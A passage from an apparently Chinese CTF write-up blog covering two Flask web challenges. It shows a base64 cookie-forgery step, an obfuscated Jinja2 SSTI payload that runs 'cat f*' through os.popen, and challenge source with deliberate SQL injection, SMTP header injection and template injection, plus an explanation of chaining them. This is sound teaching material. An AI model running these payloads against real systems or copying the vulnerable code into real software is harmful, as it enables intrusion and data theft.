+</span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">delete_cookie</span><span class="p">(</span><span class="s2">&#34;jwbcookie&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span></span></span></code></pre></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>鉴权存在问题</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="1" style="--fi-max-shown-lines:100;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">current_username</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">)</span></span></span></code></pre></div></div><p>base64解码后的username是admin就行</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="1" style="--fi-max-shown-lines:100;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">base_str</span> <span class="o">=</span> <span class="s2">&#34;eyJ1c2VyX25hbWUiOiAiYWRtaXgiLCAibG9naW5fdGltZSI6IDE3NDU2NTYxMjF9JjRlOGViNjZjNTNlN2E2YzQzYTY4MjNhZGQ0MjQwMzA0YjBlZjVhM2VmZTk5MzRjNWQ1ZTg1MGQ5NWRkN2M1M2Y4NTRmOGU0NjljYTQzYTM1Y2M3YTRhZGNhYWQwNDI0Nzc0NGY3Mjk3YjdjNjY3MjJhYTg2ODQ1YjQxYzUxYzliMjMzNjllNjFmYjE0ZWRhNjE4ODIxZDM3NzAyODA0ZmY2ZWI0M2U5ZjQzZmMwNTE0NzBjYWJkMTU4MTM0MmRmNzc1NGZjNDUzMDMyZWU2ZDgxOTRiNmM1NjNmNmRhNjBiN2RlMDExODc2ZTcxZWEyMGIyNjhkZDBlMWVlYTg0Yjk3MTcyNjI4NzA1ODk3NDYyNTI2Njk1NGQxZmY1OTc3MWM2Y2MwZjY5NzIzNDY2OWVkZWJlNDk2NmQ0OWVjN2E0NjgyZGE5NDI2MWI2ODYyZWU1ZDlmNjU4NDQ3NWMzY2U2YzdiMmZiNmE0YjM5Mzg4NzIyMDc1YjFlMmQ1MjA4MWFjYjBlY2JjYjk1YzlmOWI1MGU4ZmI0Zjk2NDA3MmIyM2E4NjBlMTRkNTE5OGYyNjJmYjVjOWZkZDZhNzYxYTQ2YWVlNTJlMDkzYTM0MGFiOTgzZGQ3MjU1N2I2YWEyYmYxMTM0N2NhN2Y3ZWQ0ZDQ3YTJiYjg1NDAzMmIzNzZi&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">origin</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">origin</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># b&#39;{&#34;user_name&#34;: &#34;admix&#34;, &#34;login_time&#34;: 1745656121}&amp;4e8eb66c53e7a6c43a6823add4240304b0ef5a3efe9934c5d5e850d95dd7c53f854f8e469ca43a35cc7a4adcaad04247744f7297b7c66722aa86845b41c51c9b23369e61fb14eda618821d37702804ff6eb43e9f43fc051470cabd1581342df7754fc453032ee6d8194b6c563f6da60b7de011876e71ea20b268dd0e1eea84b971726287058974625266954d1ff59771c6cc0f697234669edebe4966d49ec7a4682da94261b6862ee5d9f6584475c3ce6c7b2fb6a4b39388722075b1e2d52081acb0ecbcb95c9f9b50e8fb4f964072b23a860e14d5198f262fb5c9fdd6a761a46aee52e093a340ab983dd72557b6aa2bf11347ca7f7ed4d47a2bb854032b376b&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">signature</span> <span class="o">=</span> <span class="s1">&#39;{&#34;user_name&#34;: &#34;admin&#34;, &#34;login_time&#34;: 1745656121}&amp;4e8eb66c53e7a6c43a6823add4240304b0ef5a3efe9934c5d5e850d95dd7c53f854f8e469ca43a35cc7a4adcaad04247744f7297b7c66722aa86845b41c51c9b23369e61fb14eda618821d37702804ff6eb43e9f43fc051470cabd1581342df7754fc453032ee6d8194b6c563f6da60b7de011876e71ea20b268dd0e1eea84b971726287058974625266954d1ff59771c6cc0f697234669edebe4966d49ec7a4682da94261b6862ee5d9f6584475c3ce6c7b2fb6a4b39388722075b1e2d52081acb0ecbcb95c9f9b50e8fb4f964072b23a860e14d5198f262fb5c9fdd6a761a46aee52e093a340ab983dd72557b6aa2bf11347ca7f7ed4d47a2bb854032b376b&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">signature</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span></span></span></code></pre></div></div><p>然后还是打SSTI</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="1" style="--fi-max-shown-lines:100;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">ia</span><span class="o">=</span><span class="n">lipsum</span><span class="o">|</span><span class="n">escape</span><span class="o">|</span><span class="n">batch</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span><span class="o">|</span><span class="n">first</span><span class="o">|</span><span class="n">last</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">gl</span><span class="o">=</span><span class="n">ia</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&#34;globals&#34;</span><span class="o">+</span><span class="n">ia</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">bu</span><span class="o">=</span><span class="n">ia</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&#34;builtins&#34;</span><span class="o">+</span><span class="n">ia</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">im</span><span class="o">=</span><span class="n">ia</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&#34;import&#34;</span><span class="o">+</span><span class="n">ia</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="p">}{{</span><span class="n">g</span><span class="o">.</span><span class="n">pop</span><span class="p">[</span><span class="n">gl</span><span class="p">][</span><span class="n">bu</span><span class="p">][</span><span class="n">im</span><span class="p">](</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;cat f*&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span></span></span></code></pre></div></div><h1 class="heading-element" id="excellent-site"><span>Excellent-Site</span>
+  <a href="#excellent-site" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="3" style="--fi-max-shown-lines:100;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">smtplib</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">imaplib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">email</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sqlite3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">email.header</span> <span class="kn">import</span> <span class="n">decode_header</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_subjects</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">imap_server</span> <span class="o">=</span> <span class="s2">&#34;ezmail.org&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">imap_port</span> <span class="o">=</span> <span class="mi">143</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mail</span> <span class="o">=</span> <span class="n">imaplib</span><span class="o">.</span><span class="n">IMAP4</span><span class="p">(</span><span class="n">imap_server</span><span class="p">,</span> <span class="n">imap_port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mail</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mail</span><span class="o">.</span><span class="n">select</span><span class="p">(</span><span class="s2">&#34;inbox&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">status</span><span class="p">,</span> <span class="n">messages</span> <span class="o">=</span> <span class="n">mail</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;FROM &#34;admin@ezmail.org&#34;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">status</span> <span class="o">!=</span> <span class="s2">&#34;OK&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">subject</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">latest_email</span> <span class="o">=</span> <span class="n">messages</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">status</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">mail</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="n">latest_email</span><span class="p">,</span> <span class="s2">&#34;(RFC822)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">response_part</span> <span class="ow">in</span> <span class="n">msg_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">response_part</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">msg</span> <span class="o">=</span> <span class="n">email</span><span class="o">.</span><span class="n">message_from_bytes</span><span class="p">(</span><span class="n">response_part</span>  <span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                <span class="n">subject</span><span class="p">,</span> <span class="n">encoding</span> <span class="o">=</span> <span class="n">decode_header</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="s2">&#34;Subject&#34;</span><span class="p">])</span>  <span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">subject</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">subject</span> <span class="o">=</span> <span class="n">subject</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encoding</span> <span class="k">if</span> <span class="n">encoding</span> <span class="k">else</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mail</span><span class="o">.</span><span class="n">logout</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">subject</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;ERROR&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fetch_page_content</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">parsed_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parsed_url</span><span class="o">.</span><span class="n">scheme</span> <span class="o">!=</span> <span class="s1">&#39;http&#39;</span> <span class="ow">or</span> <span class="n">parsed_url</span><span class="o">.</span><span class="n">hostname</span> <span class="o">!=</span> <span class="s1">&#39;ezmail.org&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;SSRF Attack!&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;ERROR&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;ERROR&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/report&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;url&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;content&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">smtplib</span><span class="o">.</span><span class="n">_quote_periods</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mail_content</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;From: ignored@ezmail.org</span><span class="se">\r\n</span><span class="s2">To: admin@ezmail.org</span><span class="se">\r\n</span><span class="s2">Subject: </span><span class="si">{url}</span><span class="se">\r\n\r\n</span><span class="si">{content}</span><span class="se">\r\n</span><span class="s2">.</span><span class="se">\r\n</span><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">server</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTP</span><span class="p">(</span><span class="s2">&#34;ezmail.org&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">mail_content</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">_fix_eols</span><span class="p">(</span><span class="n">mail_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">mail_content</span> <span class="o">=</span> <span class="n">mail_content</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">server</span><span class="o">.</span><span class="n">sendmail</span><span class="p">(</span><span class="s2">&#34;ignored@ezmail.org&#34;</span><span class="p">,</span> <span class="s2">&#34;admin@ezmail.org&#34;</span><span class="p">,</span> <span class="n">mail_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;Submitted! Now wait till the end of the world.&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;Send FAILED&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;report.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/bot&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bot</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://ezmail.org:3000/admin&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;The admin is checking your advice(maybe)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/admin&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">ip</span> <span class="o">!=</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Forbidden IP&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">subject</span> <span class="o">=</span> <span class="n">get_subjects</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;p@ssword&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">subject</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;http://ezmail.org&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page_content</span> <span class="o">=</span> <span class="n">fetch_page_content</span><span class="p">(</span><span class="n">subject</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;div&gt;</span><span class="si">{</span><span class="n">page_content</span><span class="si">}</span><span class="s2">&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/news&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">news</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">news_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">news_id</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">news_id</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&#34;news.db&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT title FROM news WHERE id = </span><span class="si">{</span><span class="n">news_id</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Page not found.&#34;</span><span class="p">,</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">3000</span><span class="p">)</span></span></span></code></pre></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>mail注入+sql注入，首先通过<code>/report</code>提交的邮件发送方必须是admin@ezmail.org，并且ur必须是<code>http://ezmail.org</code>开头，这样我们通过<code>/bot</code>来请求<code>/admin</code>时会获取指定url的内容，然后通过<code>/news</code>的sql注入我们可以控制页面的回显，最后构造回显为SSTI Payload来使<code>/admin</code>触发</p>
